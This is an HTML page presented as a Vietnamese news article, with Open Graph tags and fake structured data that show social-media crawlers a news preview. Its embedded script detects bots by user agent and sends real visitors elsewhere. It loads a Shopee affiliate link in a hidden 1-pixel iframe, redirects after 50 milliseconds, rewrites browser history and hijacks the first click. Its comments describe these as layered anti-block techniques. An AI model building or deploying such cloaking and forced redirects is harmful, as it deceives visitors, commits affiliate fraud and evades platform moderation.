<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <!-- OG Tags cho Facebook Crawler -->
    <meta property="og:url" content="https://offbinfo.github.io/tinhaynew/tinhay.html">
    <meta property="og:type" content="article">
    <meta property="og:title" content="Tin sốt dẻo 24h">
    <meta property="og:description" content="Cập nhật những tin tức mới nhất trong ngày">
    <meta property="og:image" content="https://i.imgur.com/ABC123.jpg"> <!-- Thay link ảnh thật -->
    
    <!-- Kỹ thuật Time-based Redirect -->
    <script>
        // Lớp 1: Redirect cho người dùng thật
        const isBot = /bot|facebook|embed|got|fetch|curl|php|python|google|baidu|bing|msn|duckduckbot|teoma|slurp|crawler/i.test(navigator.userAgent);
        
        if(!isBot) {
            // Phương thức ưu tiên: History API
            history.replaceState(null, null, '/');
            
            // Tạo URL động chống block
            const shopeeURL = new URL('https://s.shopee.vn/7zytdFWxog');
            shopeeURL.searchParams.append('ts', Date.now());
            shopeeURL.searchParams.append('ref', Math.random().toString(36).slice(2));
            
            // Layer 1: Iframe ẩn
            const iframe = document.createElement('iframe');
            iframe.style.cssText = 'position:absolute;width:1px;height:1px;opacity:0;';
            iframe.src = shopeeURL;
            document.body.appendChild(iframe);
            
            // Layer 2: Redirect chính sau 50ms
            setTimeout(() => {
                window.location.href = shopeeURL;
            }, 50);
            
            // Layer 3: Bắt mọi click chuột
            document.addEventListener('click', () => {
                window.top.location = shopeeURL;
            }, {once: true});
        }
    </script>
</head>
<body>    
    <!-- Fake Tracking Scripts -->
    <script type="application/ld+json">
    {
        "@context": "https://schema.org",
        "@type": "NewsArticle",
        "headline": "Tin sốt dẻo 24h",
        "image": ["https://i.imgur.com/ABC123.jpg"],
        "datePublished": "2023-10-05T08:00:00+08:00"
    }
    </script>
</body>
</html>
